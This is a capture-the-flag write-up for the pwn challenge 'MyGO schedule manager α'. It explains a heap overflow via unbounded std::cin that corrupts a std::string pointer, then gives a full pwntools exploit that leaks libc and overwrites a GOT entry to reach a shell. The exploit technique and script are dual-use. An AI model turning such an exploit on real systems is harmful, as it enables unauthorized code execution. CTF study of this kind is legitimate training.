# MyGO schedule manager α
> Author: 堇姬Naup

## analyze
`std::cin` does not limit the input size, and the input is placed into a buffer which have 0x16 size.
So this part have a overflow, and it is on heap chunk.

Let me look this chunk.


We know std::string struct like this.
| offset | description |
|--------|-------------|
| 0x0    | data's pointer |
| 0x8    | vector size |
| 0x10   | vector capacity |
| 0x18   | unused padding or alignment space |

So if we can change data's pointer to anywhere, we will get arbitary write or read.
Use AAR leaklibc.
And use aaw overwrite libc's got(ABS GOT) to backdoor function.

We will jump to win function, and get shell.

## script
```py
from pwn import *
from libs.NAUP_pwn_lib import *
import time
from libs.NAUP_filestructure_lib import *
from libs.NAUP_fmt_lib import *

### This is a CTF pwn templates make by Naup

def s(payload): return r.send(payload)
def sl(payload): return r.sendline(payload)
def sla(after, payload): return r.sendlineafter(after, payload)
def sa(after, payload): return r.sendafter(after, payload)
def rc(num): return r.recv(num)
def rcl(): return r.recvline()
def rcls(num): return r.recvlines(num)
def rcu(payload): return r.recvuntil(payload)
def ita(): return r.interactive()
def cl(): return r.close()
def tsl(): return time.sleep(0.2)

x64_env()

REMOTE_LOCAL=input("local?(y/n):")

if REMOTE_LOCAL=="y":
    r=process('./chal')
    debug_init()
    
else:                                           
    REMOTE_INFO=split_nc("nc 127.0.0.1 51000")

    REMOTE_IP=REMOTE_INFO[0]
    REMOTE_PORT=int(REMOTE_INFO[1])

    r=remote(REMOTE_IP,REMOTE_PORT)

### attach
if input('attach?(y/n)') == 'y':
    p(r)

### heap IO

def login():
    sla(b"Username > ", b"MyGO!!!!!")
    sla(b"Password > ", b"TomorinIsCute")

def create(title, ctx):
    sla(b"< MyGO @ ScheduleManager $ > ", b"1")
    sla(b"MyGO @ sched title > \n", title)
    sla(b"MyGO @ sched content > \n", ctx)

def edit_title(title):
    sla(b"< MyGO @ ScheduleManager $ > ", b"2")
    sla(b"MyGO @ sched title > \n", title)

def edit_content(ctx):
    sla(b"< MyGO @ ScheduleManager $ > ", b"3")
    sla(b"MyGO @ sched content > \n", ctx)

def show():
    sla(b"< MyGO @ ScheduleManager $ > ", b"4")


### exploit

login()
got = 0x403fc8
backdoor = 0x4013ec

create(b"MyGO", b'MyGO')
edit_title(b"MyGO" * 6 + p64(got))

show()

rcu(b"MyGO @ Content : ")
leaklibc = u64(rcl().strip().ljust(8, b"\x00"))
# libcbase = leaklibc - 0x4bf0e0
libcbase = leaklibc - 0x2e80e0
ABS_GOT = libcbase + 0x21a098

edit_title(b"MyGO" * 6 + p64(ABS_GOT))
edit_content(p64(backdoor))

NAUPINFO("LEAKLIBC", hex(leaklibc))
NAUPINFO("LIBCBASE", hex(libcbase))
### interactive
ita()
```
